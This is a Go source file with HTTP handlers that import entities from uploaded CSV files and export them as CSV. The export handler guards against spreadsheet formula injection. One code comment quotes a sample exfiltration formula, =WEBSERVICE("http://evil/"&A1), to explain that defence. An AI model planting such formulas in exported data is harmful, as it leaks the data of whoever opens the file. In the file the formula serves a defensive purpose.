package http

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"

	"github.com/zkrebbekx/flexitype/application"
	appquery "github.com/zkrebbekx/flexitype/application/query"
	appvalue "github.com/zkrebbekx/flexitype/application/value"
	domainerrors "github.com/zkrebbekx/flexitype/domain/errors"
	"github.com/zkrebbekx/flexitype/pkg/db"
)

// maxImportUpload caps an import upload's size.
const maxImportUpload = 16 << 20 // 16 MiB

// importMapping is the JSON side of the import multipart form.
type importMapping struct {
	KeyColumn string            `json:"key_column"`
	Mapping   map[string]string `json:"mapping"`
	Mode      string            `json:"mode"`
	DryRun    bool              `json:"dry_run"`
}

// importEntities loads a CSV upload into a type's entities. The multipart
// form carries the CSV as "file" and a JSON "mapping" describing the key
// column, column→attribute map, commit mode and dry-run flag.
func (s *server) importEntities(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, maxImportUpload)
	if err := r.ParseMultipartForm(maxImportUpload); err != nil {
		writeError(w, s.log, domainerrors.NewValidation("could not read upload: "+err.Error()))
		return
	}

	var m importMapping
	if err := json.Unmarshal([]byte(r.FormValue("mapping")), &m); err != nil {
		writeError(w, s.log, domainerrors.NewValidation("invalid mapping json: "+err.Error()))
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		writeError(w, s.log, domainerrors.NewValidation("missing csv file: "+err.Error()))
		return
	}
	defer func() { _ = file.Close() }()

	columns, rows, err := readCSV(file)
	if err != nil {
		writeError(w, s.log, domainerrors.NewValidation(err.Error()))
		return
	}

	report, err := application.FromContext(r.Context()).Values().Import(r.Context(), appvalue.ImportInput{
		TypeDefinitionID: chi.URLParam(r, "typeDefinitionID"),
		KeyColumn:        m.KeyColumn,
		Mapping:          m.Mapping,
		Columns:          columns,
		Rows:             rows,
		Mode:             appvalue.ImportMode(m.Mode),
		DryRun:           m.DryRun,
	})
	if err != nil {
		writeError(w, s.log, err)
		return
	}
	writeJSON(w, http.StatusOK, report)
}

// readCSV reads a header row and the data rows from an uploaded CSV.
func readCSV(r io.Reader) (header []string, rows [][]string, err error) {
	cr := csv.NewReader(r)
	cr.FieldsPerRecord = -1 // tolerate ragged rows; the importer skips short cells
	header, err = cr.Read()
	if err != nil {
		return nil, nil, fmt.Errorf("read csv header: %w", err)
	}
	for {
		rec, err := cr.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, nil, fmt.Errorf("read csv row: %w", err)
		}
		rows = append(rows, rec)
	}
	return header, rows, nil
}

// exportEntities streams a type's entities as CSV. `attributes` (comma
// separated internal names) chooses columns; `query` (FQL) or `entity_ids`
// restricts the rows, otherwise all live entities export.
func (s *server) exportEntities(w http.ResponseWriter, r *http.Request) {
	typeID := chi.URLParam(r, "typeDefinitionID")
	var attributes []string
	if raw := strings.TrimSpace(r.URL.Query().Get("attributes")); raw != "" {
		attributes = splitCSVParam(raw)
	}

	entityIDs, err := s.exportRowSet(r, typeID)
	if err != nil {
		writeError(w, s.log, err)
		return
	}

	out, err := application.FromContext(r.Context()).Values().Export(r.Context(), appvalue.ExportInput{
		TypeDefinitionID: typeID,
		Attributes:       attributes,
		EntityIDs:        entityIDs,
	})
	if err != nil {
		writeError(w, s.log, err)
		return
	}

	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", "export-"+typeID+".csv"))
	cw := csv.NewWriter(w)
	_ = cw.Write(sanitizeCSVRow(out.Columns))
	for _, row := range out.Rows {
		_ = cw.Write(sanitizeCSVRow(row))
	}
	cw.Flush()
}

// sanitizeCSVCell neutralizes spreadsheet formula injection (CWE-1236). A
// cell whose first character is =, +, -, @, tab or carriage return is
// interpreted as a formula by common spreadsheet applications, so a stored
// value such as =WEBSERVICE("http://evil/"&A1) would execute when a victim
// opens the export — exfiltration or DDE. Prefixing the cell with a single
// quote forces the application to read it as literal text; Content-Disposition
// alone does not mitigate this.
func sanitizeCSVCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// sanitizeCSVRow neutralizes every cell of a row in place.
func sanitizeCSVRow(row []string) []string {
	for i, c := range row {
		row[i] = sanitizeCSVCell(c)
	}
	return row
}

// exportRowSet resolves which entities to export: an explicit id list, an
// FQL result set, or nil (meaning "all live entities of the type").
func (s *server) exportRowSet(r *http.Request, typeID string) ([]string, error) {
	if raw := strings.TrimSpace(r.URL.Query().Get("entity_ids")); raw != "" {
		return splitCSVParam(raw), nil
	}
	q := strings.TrimSpace(r.URL.Query().Get("query"))
	if q == "" {
		return nil, nil
	}

	app := application.FromContext(r.Context())
	// FQL runs against the root type's internal name; resolve it from the id.
	t, err := app.TypeDefinitions().Get(r.Context(), typeID)
	if err != nil {
		return nil, err
	}
	var ids []string
	var cursor *string
	limit := 500
	for {
		out, err := app.Query().Execute(r.Context(), appquery.ExecuteInput{
			Type:  t.InternalName,
			Query: q,
			Page:  db.PageArgs{Limit: &limit, Cursor: cursor},
		})
		if err != nil {
			return nil, err
		}
		for _, it := range out.Items {
			ids = append(ids, it.EntityID)
		}
		if out.PageInfo.NextCursor == nil || len(ids) >= maxExportQueryRows {
			break
		}
		cursor = out.PageInfo.NextCursor
	}
	return ids, nil
}

// maxExportQueryRows caps how many FQL-matched entities an export collects.
const maxExportQueryRows = 10000

// splitCSVParam splits a comma-separated query parameter, trimming blanks.
func splitCSVParam(raw string) []string {
	parts := strings.Split(raw, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}
